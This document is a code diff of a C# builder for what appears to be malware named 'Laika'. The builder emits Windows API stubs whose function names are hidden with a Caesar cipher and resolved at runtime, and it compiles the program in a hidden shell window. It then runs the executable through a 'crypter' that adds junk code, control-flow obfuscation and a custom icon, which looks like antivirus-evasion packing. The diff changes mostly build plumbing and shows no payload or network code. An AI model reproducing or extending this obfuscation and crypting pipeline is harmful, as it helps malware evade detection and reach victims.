@@ -204,8 +204,7 @@ namespace Server
 #endif
 void api_{functionName}(void) {{
 #ifdef _WIN32
-    char api[] = ""{Utils.CAESAR(api.function_name)}"";
-    f{api.function_name} p{api.function_name} = GetApi(L""{api.dll_name}"", PCAESAR_DECRYPT(api));
+    f{api.function_name} p{api.function_name} = GetApi(L""{api.dll_name}"", ""{Utils.CAESAR(api.function_name)}"");
     if (p{api.function_name} == NULL) {{
         state->STACK_IDX -= {api.arguments.Count};
         {(returnsVoid ? string.Empty : "state->registers->eax = 1;")}
@@ -276,7 +275,8 @@ void api_{functionName}(void) {{
 
             AppendApisToAPIC();
             UpdateApiHeaderFile();
-
+ 
+            /*
             button2.Text = "Building pasm...";
             button2.Update();
 
@@ -308,6 +308,7 @@ void api_{functionName}(void) {{
             button2.Text = "Building Laika...";
             button2.Update();
 
+            */
             /*
             startInfo.Arguments = "/C \"\"" + cmd_line + "\"\" ../Laika /p:Configuration=Release;Platform=x86";
             startInfo.RedirectStandardError = true;
@@ -335,13 +336,30 @@ void api_{functionName}(void) {{
             newContent += "};"; 
             File.WriteAllText(filePath, newContent);
 
+            /*
             startInfo.Arguments = "/C \"\"" + cmd_line + "\"\" ../Laika /p:Configuration=Release;Platform=x86";
             startInfo.RedirectStandardError = true;
             process.StartInfo = startInfo;
             process.Start();
             output += process.StandardOutput.ReadToEnd();
             output += process.StandardError.ReadToEnd();
+            process.WaitForExit();
+            */
 
+            button2.Text = "Building Laika...";
+            button2.Update();
+
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd";
+            startInfo.Arguments = "/C cd ../Laika/ && mingw32-make fclean && mingw32-make";
+            startInfo.RedirectStandardOutput = true;
+            startInfo.UseShellExecute = false;
+            startInfo.CreateNoWindow = true;
+            process.StartInfo = startInfo;
+            process.Start();
+            output += process.StandardOutput.ReadToEnd();
             process.WaitForExit();
 
             if (!checkBox1.Checked)
@@ -358,7 +376,7 @@ void api_{functionName}(void) {{
                 args += " --junk " + numericUpDown1.Value.ToString();
             if (checkBox4.Checked)
                 args += " --control_flow " + numericUpDown2.Value.ToString();
-            if (pictureBox1.ImageLocation != "")
+            if (pictureBox1.ImageLocation != "" && pictureBox1.ImageLocation != null)
                 args += " --icon " + pictureBox1.ImageLocation;
 
             startInfo.Arguments = "/C cd ..\\patate-crypter\\Builder && python gui.py --file ..\\..\\bin\\Laika.exe" + args;
